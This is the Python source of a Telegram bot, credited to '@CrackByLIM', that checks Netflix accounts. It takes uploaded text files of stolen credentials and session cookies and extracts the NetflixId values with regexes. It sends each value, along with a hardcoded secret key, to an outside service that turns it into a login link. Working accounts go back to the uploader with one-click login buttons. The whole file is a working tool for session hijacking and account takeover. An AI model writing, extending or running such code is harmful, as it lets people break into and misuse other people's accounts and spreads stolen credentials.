import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# Configuration
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== ULTRA SIMPLE UNIVERSAL PARSER ====================
# This works for ANY format - emojis, special characters, anything!

def clean_text(text):
    """Clean text but preserve important information"""
    try:
        # Remove null bytes and control characters
        text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text)
        return text
    except:
        return text

def parse_account_line(line):
    """ULTRA SIMPLE - ONLY looks for NetflixId= anywhere in the text"""
    try:
        # Clean the line first
        line = clean_text(line.strip())
        if not line:
            return None
        
        account = {}
        
        # STEP 1: Find NetflixId= ANYWHERE in the text (this is ALL that matters)
        # This regex works with emojis, special chars, everything!
        netflix_id_match = re.search(r'NetflixId=([a-zA-Z0-9%._-]+)', line)
        
        if not netflix_id_match:
            # Try alternate pattern with & and other special chars
            netflix_id_match = re.search(r'NetflixId=([^&\s\'"]+)', line)
        
        if netflix_id_match:
            account['netflix_id'] = netflix_id_match.group(1).strip()
            logger.info(f"✅ Found NetflixId: {account['netflix_id'][:30]}...")
        else:
            # Try to find in cookie pattern
            cookie_match = re.search(r'[Cc]ookie.*?[=:].*?(NetflixId=[^&\s]+)', line)
            if cookie_match:
                netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_match.group(1))
                if netflix_id_match:
                    account['netflix_id'] = netflix_id_match.group(1).strip()
                    logger.info(f"✅ Found NetflixId from cookie: {account['netflix_id'][:30]}...")
        
        # If we found a NetflixId, try to get email (optional)
        if 'netflix_id' in account:
            # Look for email pattern
            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
            if email_match:
                account['email'] = email_match.group(1).strip()
            else:
                # Generate placeholder email
                account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
            
            # Look for direct URL (optional)
            url_match = re.search(r'(https?://[^\s]+nftoken=[^\s]+)', line)
            if url_match:
                account['direct_url'] = url_match.group(1).strip()
                logger.info(f"✅ Found direct URL")
            
            # Try to extract other useful fields (optional)
            # Name
            name_match = re.search(r'[Nn]ame[=:]\s*([^\n]+)', line)
            if name_match:
                account['name'] = name_match.group(1).strip()
            
            # Country
            country_match = re.search(r'[Cc]ountry[=:]\s*([^\n]+)', line)
            if country_match:
                account['country'] = country_match.group(1).strip()
            
            # Plan
            plan_match = re.search(r'[Pp]lan[=:]\s*([^\n]+)', line)
            if plan_match:
                account['plan'] = plan_match.group(1).strip()
            
            # Quality
            quality_match = re.search(r'[Qq]uality[=:]\s*([^\n]+)', line)
            if quality_match:
                account['quality'] = quality_match.group(1).strip()
            
            return account
        
        return None
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email, account_data=None):
    """Check if Netflix ID is valid by calling the API"""
    
    # If account already has a direct URL from the file, use it without API call
    if account_data and account_data.get('direct_url'):
        logger.info(f"✅ Using pre-validated URL for {email}")
        return {
            "success": True,
            "login_url": account_data['direct_url'],
            "email": email,
            "data": {"pre_validated": True}
        }
    
    # If no netflix_id, can't check
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "email": email
        }
    
    # Otherwise, call the API as normal
    try:
        url = f"{API_URL}/api/gen"
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(url, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response",
                "email": email
            }
        
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            return {
                "success": False,
                "error": result.get('error', 'Unknown error'),
                "error_code": result.get('error_code', 'UNKNOWN_ERROR'),
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with premium formatting"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Any format works!** I'll automatically:
✅ Extract Netflix ID from ANY format (including emojis!)
✅ Check validity with official API
✅ Send premium login links
✅ Show detailed statistics

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • ANY format is accepted!
   • Emojis, special characters, anything!
   • Just make sure it contains `NetflixId=...`

2️⃣ **Send the file to me**
   • I'll automatically extract all Netflix IDs
   • Process each one with the API
   • Only valid accounts will be sent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **Supported Formats (ALL WORK):**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ `email:password | NetflixCookies = NetflixId=...`
✓ `馃崻 Cookie: NetflixId=...` (emoji format)
✓ `NetflixId=v%3D3%26ct%3D...` (raw format)
✓ **ANY text containing NetflixId=...**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance Metrics:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid Accounts:** `{valid_accounts}`
• **❌ Invalid Accounts:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **System Status:**
• **Bot:** 🟢 ONLINE
• **API:** 🟢 CONNECTED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║         ✅ SESSION CLEARED ✅          ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You can now upload a new file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with premium formatting"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"""
╔════════════════════════════════════════╗
║         ⏰ RATE LIMIT EXCEEDED         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Please wait a minute before trying again.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"""
╔════════════════════════════════════════╗
║         ❌ INVALID FILE TYPE           ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Please upload a `.txt` file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # Send initial message
    status_msg = await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║        📥 FILE RECEIVED 📥             ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
⏳ **Status:** Downloading...

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines
        lines = content.split('\n')
        valid_lines = [l for l in lines if l.strip()]
        
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║         📊 ANALYZING FILE 📊           ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
📝 **Total Lines:** `{len(lines)}`
✅ **Processing:** `{len(valid_lines)}` lines

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔄 **Looking for NetflixId= in any format...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        
        # Process each line
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []
        
        for i, line in enumerate(valid_lines, 1):
            # Parse account using universal parser
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                continue
            
            # Calculate progress
            progress = i / len(valid_lines)
            bar_length = 15
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Update progress every few accounts
            if i % 3 == 0 or i == len(valid_lines):
                await status_msg.edit_text(
                    f"""
╔════════════════════════════════════════╗
║        🔄 PROCESSING ACCOUNTS 🔄       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Progress:** `{i}/{len(valid_lines)}`
📈 **Complete:** `{progress*100:.1f}%`
`{bar}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Valid Found:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """,
                    parse_mode='Markdown'
                )
            
            # Check with API
            email = account.get('email', f"user_{account['netflix_id'][:8]}@unknown.com")
            result = await check_netflix_id(account['netflix_id'], email, account)
            
            # Update global stats
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Store valid account
                valid_accounts_found.append({
                    'email': email,
                    'password': account.get('password', 'N/A'),
                    'login_url': result['login_url'],
                    'country': account.get('country', 'N/A'),
                    'plan': account.get('plan', 'N/A'),
                    'quality': account.get('quality', 'N/A'),
                    'streams': account.get('max_streams', 'N/A'),
                    'name': account.get('name', 'N/A'),
                    'direct_url': account.get('direct_url', None)
                })
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        
        # COMPLETION SCREEN
        success_rate = valid_count/len(valid_lines)*100 if len(valid_lines) > 0 else 0
        
        completion_text = f"""
╔════════════════════════════════════════╗
║        ✅ PROCESSING COMPLETE ✅       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **RESULTS SUMMARY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
📝 **Total Processed:** `{len(valid_lines)}`
✅ **Valid Accounts:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`
📈 **Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Sending {valid_count} valid account(s)...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await status_msg.edit_text(completion_text, parse_mode='Markdown')
        
        # Send ALL valid accounts
        if valid_accounts_found:
            for idx, acc in enumerate(valid_accounts_found, 1):
                # Check if this was a pre-validated account (has direct_url)
                if acc.get('direct_url'):
                    premium_msg = f"""
╔════════════════════════════════════════╗
║     ✅ PREMIUM ACCOUNT #{idx}/{valid_count} ✅     ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **ACCOUNT DETAILS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Email:** `{acc['email']}`
• **Name:** `{acc.get('name', 'N/A')}`
• **Country:** `{acc.get('country', 'N/A')}`
• **Plan:** `{acc.get('plan', 'N/A')}`
• **Quality:** `{acc.get('quality', 'N/A')}`
• **Max Streams:** `{acc.get('streams', 'N/A')}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **DIRECT LOGIN LINK**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`{acc['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Pre-validated account from file*

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """
                else:
                    premium_msg = f"""
╔════════════════════════════════════════╗
║     ✅ VALID ACCOUNT #{idx}/{valid_count} ✅     ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **LOGIN CREDENTIALS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Email:** `{acc['email']}`
• **Password:** `{acc.get('password', 'N/A')}`
• **Status:** `✅ ACTIVE`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 **ACCOUNT DETAILS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Country:** `{acc.get('country', 'N/A')}`
• **Plan:** `{acc.get('plan', 'N/A')}`
• **Quality:** `{acc.get('quality', 'N/A')}`
• **Max Streams:** `{acc.get('streams', 'N/A')}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **LOGIN LINK**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`{acc['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Link expires - use it now!*

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                
                await update.message.reply_text(
                    premium_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
            
            # Final summary
            final_summary = f"""
╔════════════════════════════════════════╗
║        📬 ALL ACCOUNTS SENT 📬         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Successfully sent {valid_count} valid account(s)**

💡 **Check messages above for login links**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            await update.message.reply_text(final_summary, parse_mode='Markdown')
            
        else:
            # No valid accounts found
            await update.message.reply_text(
                f"""
╔════════════════════════════════════════╗
║        ❌ NO VALID ACCOUNTS ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No valid accounts were found in your file.

💡 **Suggestions:**
• Make sure file contains NetflixId=
• Get fresh Netflix cookies
• Try again later

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
        
        # Store in session
        user_sessions[user_id] = {
            'last_file': document.file_name,
            'valid': valid_count,
            'invalid': invalid_count,
            'total': valid_count + invalid_count
        }
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║           ❌ ERROR ❌                  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
❌ **Error:** `{str(e)[:100]}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Please try again or check file format

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 PROFESSIONAL NETFLIX ACCOUNT CHECKER")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("📝 Universal parser enabled - accepts ANY format including emojis!")
    print("=" * 60)
    
    # Create application with custom settings
    app = (
        Application.builder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .build()
    )
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Initialize and start
    try:
        await app.initialize()
        await app.start()
        await app.updater.start_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        print("✅ Bot started successfully!")
        print("=" * 60)
        print("🤖 Bot is now running! Waiting for files...")
        print("=" * 60)
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Error in bot: {e}")
        raise e
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        try:
            clear_telegram_webhook()
        except:
            pass

if __name__ == '__main__':
    main()
